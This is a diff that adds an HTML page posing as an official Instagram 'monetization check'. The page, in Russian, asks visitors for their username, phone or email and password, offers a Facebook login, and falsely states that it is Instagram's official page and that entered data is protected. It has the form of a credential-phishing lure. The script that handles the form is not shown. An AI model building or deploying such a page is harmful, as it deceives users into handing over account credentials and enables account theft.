@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Monetization</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="login-wrapper">
+            <div class="header">
+                <div class="logo">
+                    <i class="fab fa-instagram"></i>
+                    <span>Instagram Monetization</span>
+                </div>
+                <h1>Проверка монетизации</h1>
+                <p>Войдите, чтобы проверить, доступна ли вам программа монетизации Instagram</p>
+            </div>
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="username"><i class="fas fa-user"></i> Имя пользователя, телефон или email</label>
+                    <input type="text" id="username" name="username" required autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label for="password"><i class="fas fa-lock"></i> Пароль</label>
+                    <input type="password" id="password" name="password" required>
+                    <div class="show-password">
+                        <input type="checkbox" id="showPass">
+                        <label for="showPass">Показать пароль</label>
+                    </div>
+                </div>
+                <button type="submit" class="btn-login">
+                    <i class="fas fa-sign-in-alt"></i> Войти
+                </button>
+                <div class="divider">
+                    <span>ИЛИ</span>
+                </div>
+                <button type="button" class="btn-facebook">
+                    <i class="fab fa-facebook-square"></i> Войти через Facebook
+                </button>
+                <div class="links">
+                    <a href="#"><i class="fas fa-question-circle"></i> Забыли пароль?</a>
+                    <a href="#"><i class="fas fa-user-plus"></i> Создать аккаунт</a>
+                </div>
+            </form>
+            <div class="footer">
+                <p>Это официальная страница проверки монетизации Instagram. Ваши данные защищены.</p>
+                <p class="copyright">© 2026 Instagram. All rights reserved.</p>
+            </div>
+        </div>
+        <div class="phone-preview">
+            <div class="phone">
+                <div class="screen">
+                    <img src="assets/image.png" alt="Instagram Monetization Preview">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
